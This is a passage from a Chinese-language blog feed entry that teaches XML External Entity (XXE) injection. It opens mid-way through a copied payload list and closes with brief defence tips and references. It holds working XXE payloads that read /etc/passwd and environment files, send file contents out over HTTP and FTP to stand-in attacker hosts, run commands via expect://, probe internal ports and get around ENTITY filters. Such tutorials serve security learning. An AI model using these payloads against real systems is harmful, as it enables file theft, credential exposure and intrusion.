&lt;!ENTITY % stuff SYSTEM "file:///usr/local/tomcat/webapps/customapp/WEB-INF/applicationContext.xml "&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % end "]]&gt;</span>"&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">dtd</span> <span class="attr">SYSTEM</span> "<span class="attr">http:</span>//<span class="attr">evil</span>/<span class="attr">evil.xml</span>"&gt;</span></span><br><span class="line">%dtd;</span><br><span class="line">]&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;all;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">## External dtd: ##</span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">all</span> "%<span class="attr">start</span>;%<span class="attr">stuff</span>;%<span class="attr">end</span>;"&gt;</span></span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------</span><br><span class="line">File-not-found exception based extraction</span><br><span class="line">------------------------------------------------------------------</span><br><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE test [  </span></span><br><span class="line"><span class="meta">  &lt;!ENTITY % one SYSTEM "http://attacker.tld/dtd-part" &gt;</span></span><br><span class="line"><span class="meta">  %one;</span></span><br><span class="line"><span class="meta">  %two;</span></span><br><span class="line"><span class="meta">  %four;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line">## External dtd: ##</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">three</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">etc</span>/<span class="attr">passwd</span>"&gt;</span></span><br><span class="line">&lt;!ENTITY % two "&lt;!ENTITY % four SYSTEM 'file:///%three;'&gt;"&gt;</span><br><span class="line"></span><br><span class="line">-------------------------^ you might need to encode this % (depends on your target) as: &amp;#x25;</span><br><span class="line"></span><br><span class="line">--------------</span><br><span class="line">FTP</span><br><span class="line">--------------</span><br><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [ </span></span><br><span class="line"><span class="meta">&lt;!ENTITY % asd SYSTEM "http://x.x.x.x:4444/ext.dtd"&gt;</span></span><br><span class="line"><span class="meta">%asd;</span></span><br><span class="line"><span class="meta">%c;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span>&amp;rrr;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## External dtd ##</span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">d</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">proc</span>/<span class="attr">self</span>/<span class="attr">environ</span>"&gt;</span></span><br><span class="line">&lt;!ENTITY % c "&lt;!ENTITY rrr SYSTEM 'ftp://x.x.x.x:2121/%d;'&gt;"&gt;</span><br><span class="line"></span><br><span class="line">---------------------------</span><br><span class="line">Inside SOAP body</span><br><span class="line">---------------------------</span><br><span class="line"><span class="tag">&lt;<span class="name">soap:Body</span>&gt;</span><span class="tag">&lt;<span class="name">foo</span>&gt;</span>&lt;![CDATA[&lt;!DOCTYPE doc [&lt;!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"&gt; %dtd;]&gt;&lt;xxx/&gt;]]&gt;<span class="tag">&lt;/<span class="name">foo</span>&gt;</span><span class="tag">&lt;/<span class="name">soap:Body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">---------------------------</span><br><span class="line">Untested - WAF Bypass</span><br><span class="line">---------------------------</span><br><span class="line"><span class="meta">&lt;!DOCTYPE :. SYTEM "http://"</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE :_-_: SYTEM "http://"</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE &#123;0xdfbf&#125; SYSTEM "http://"</span></span><br></pre></td></tr></table></figure>
<h4 id="dtd文档类型定">DTD文档类型定</h4>
<p>1） <strong>DTD内部、外部声明</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">内部DTD：</span><br><span class="line">假如 DTD 被包含在您的 XML 源文件中，它应当通过下面的语法包装在一个 DOCTYPE 声明中：</span><br><span class="line">&lt;!DOCTYPE root-element [element-declarations]&gt;</span><br><span class="line"></span><br><span class="line">外部DTD：</span><br><span class="line">假如 DTD 位于 XML 源文件的外部，那么它应通过下面的语法被封装在一个 DOCTYPE 定义中：</span><br><span class="line">&lt;!DOCTYPE root-element SYSTEM “filename”&gt;</span><br><span class="line">解析时会调用外部DTD文件filename</span><br></pre></td></tr></table></figure>
<p>2） <strong>DTD参数实体、非参数实体</strong></p>
<p>除了外部和内部的声明之外，DTD的实体还有参数和非参数之分。</p>
<p>其中参数实体只能在DTD内部(XML的第二部分)以<code>%实体名</code>的方式引用，而非参数实体则可在XML文档元素，也就是XML的第三个部分以<code>&amp;实体名</code>的方式引用</p>
<p>举例：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">这是一个内部实体+非参数实体，参数在XML文档文档元素部分引用，不能使用协议</span><br><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY name "nMask"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>&amp;name;<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">这是一个外部实体+参数实体，参数在XML文档DTD内部引用，可以使用外部协议</span><br><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % name SYSTEM "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="meta">    %name;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="xxe利用方式">XXE利用方式</h3>
<p>使用hackbar post构造的xml文档，或者burpsuite抓包进行post</p>
<h4 id="a-有回显的注入">A) 有回显的注入</h4>
<h5 id="任意文件读取">1）任意文件读取</h5>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY file SYSTEM "file:///etc/passwd"&gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>&amp;file;<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="命令执行">2）命令执行</h5>
<p>在安装expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE xxe [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT name ANY &gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "expect://id" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="内网端口探测">3）内网端口探测</h5>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE xxe [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT name ANY &gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "http://127.0.0.1:80" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以对80端口进行探测，一般会探测比较常用的端口。</p>
<h5 id="攻击内网网站">4）攻击内网网站</h5>
<p>结合网站框架本身的漏洞，如struts2</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE xxe [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT name ANY &gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "http://127.0.0.1:80/payload" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="过滤了entity关键字">5）过滤了ENTITY关键字</h5>
<p>DTD文档支持这么一种定义，直接在定义文档类型的时候引入外部DTD文档，也就是在xml文档的第三部分使用ENTITY，所以在DTD文档类型定义中过滤了ENTITY的情况下，同样可以实现以上的四种方法。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE svg SYSTEM "http://118.89.16.36/evil.dtd"&gt;</span>   #????  test?  svg?</span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;test;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line">evil.dtd</span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">test</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">etc</span>/<span class="attr">passwd</span>"&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以看到在文档内容的部分使用了恶意的代码构造。</p>
<h5 id="行不通的方法">6）行不通的方法</h5>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY %param1 "file:///c:/1.txt"&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY %param2 "http://127.0.0.1/?payload=%param1"&gt;</span></span><br><span class="line"><span class="meta">%param2;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
<p>这样看起来可以读取系统文件内容来作为payload，是个可用的方法。 但是这样做行不通，原因是不能在实体定义中引用参数实体，即有些解释器不允许在内层实体中使用外部连接，无论内层是一般实体还是参数实体。</p>
<h4 id="b-无回显的xxe漏洞blind-xxe">B) 无回显的XXE漏洞—Blind XXE</h4>
<h3 id="xxe防御">xxe防御</h3>
<ol type="1">
<li>使用开发语言提供的禁用外部实体的方法;</li>
<li>过滤用户提交的XML数据;
<ol type="1">
<li>检查所使用的底层xml解析库，默认禁止外部实体的解析</li>
<li>使用第三方应用代码及时升级补丁</li>
</ol></li>
</ol>
<p>参考：</p>
<p><a href="https://gist.github.com/staaldraad/01415b990939494879b4#file-xxe_payloads" target="_blank" rel="noopener">xxe payload</a></p>
<p><a href="https://blog.csdn.net/zz_Caleb/article/details/90900214" target="_blank" rel="noopener">xxe 入门</a></p>
<p><a href="https://www.exploit-db.com/docs/45374" target="_blank" rel="noopener">XXE Explanation and Exploitation</a>: VulnHub -- XXE 1</p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;xxe简介&quot;&gt;xxe简介&lt;/h3&gt;
&lt;p&gt;XML External Entity Injection，xml外部实体注入漏洞&lt;/p&gt;
&lt;p&gt;当允许引用外部实体时，通过构造恶意内容可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。&lt;/p&gt;
&lt;
    
    </summary>
    
      <category term="Network Security" scheme="http://flamepeak.com/categories/Network-Security/"/>
    
    
      <category term="XXE" scheme="http://flamepeak.com/tags/XXE/"/>
    
  </entry>
  
</feed>
